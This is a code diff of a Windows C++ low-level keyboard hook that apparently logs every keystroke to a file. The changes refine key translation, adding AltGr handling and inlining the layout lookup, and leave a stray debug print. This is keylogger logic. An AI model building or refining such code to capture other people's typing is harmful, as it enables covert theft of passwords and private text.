@@ -136,7 +136,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
     /*
      * HC_ACTION        Process the event normally.
      * WM_KEYDOWN       Key pressed
-     * WM_SYSKEYDOWN    System key pressed (like ALT)
+     * WM_SYSKEYDOWN    System key pressed (like ALT or F10)
      */
 
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
@@ -176,18 +176,24 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
         // Set modifier keys manually
         if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
             keyboardState[VK_SHIFT] |= 0x80;
-        if (GetKeyState(VK_CAPITAL) & 0x0001) // toggle bit, not pressed
+
+        if (GetKeyState(VK_CAPITAL) & 0x0001) // Toggle bit for CapsLock (unpressed)
             keyboardState[VK_CAPITAL] |= 0x01;
         else
             keyboardState[VK_CAPITAL] &= ~0x01; // Clear the toggle state if not toggled
+
         if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
             keyboardState[VK_CONTROL] |= 0x80;
         if (GetAsyncKeyState(VK_MENU) & 0x8000) // Alt key
             keyboardState[VK_MENU] |= 0x80;
 
-        // Gets the input language layout of the current thread
-        const HKL layout = GetKeyboardLayout(0);
-        
+        // If AltGr (RightAlt) is down, remove the LeftCtrl bit so ToUnicodeEx
+        // treats it as a layout AltGr combo instead of Ctrl+Alt.
+        if ((keyboardState[VK_RMENU] & 0x80) && (keyboardState[VK_LCONTROL] & 0x80)) {
+            keyboardState[VK_LCONTROL] &= ~0x80;
+            keyboardState[VK_CONTROL]  &= ~0x80;
+        }
+
         /*
          * Converts the virtual key code (vkCode) and scan code into the
          *  corresponding Unicode character(s)
@@ -206,8 +212,8 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
         int result = ToUnicodeEx(
             p->vkCode, p->scanCode, keyboardState,
             buffer, TW_KEYSTROKE_MAX,
-            0x0004, // Don't change keyboard state (resolves dead keys problem)
-            layout
+            0x0004,                 // Don't change keyboard state (resolves dead keys problem)
+            GetKeyboardLayout(0)    // Gets the input language layout of the current thread
         );
 
         /* 
@@ -215,14 +221,12 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  (like arrow keys, function keys, Ctrl+C), log a fallback string that includes
          *  the virtual key code.
          */
-
+std::cout << "res: " << result << std::endl;
         if (result > 0 && isPrintable(buffer[0])) {
             buffer[result] = L'\0';
             _keyStroke = buffer;
         } 
-        else {
-            _keyStroke = getKeyName(p->vkCode);;
-        }
+        else _keyStroke = getKeyName(p->vkCode);;
 
         logToFile();
     }
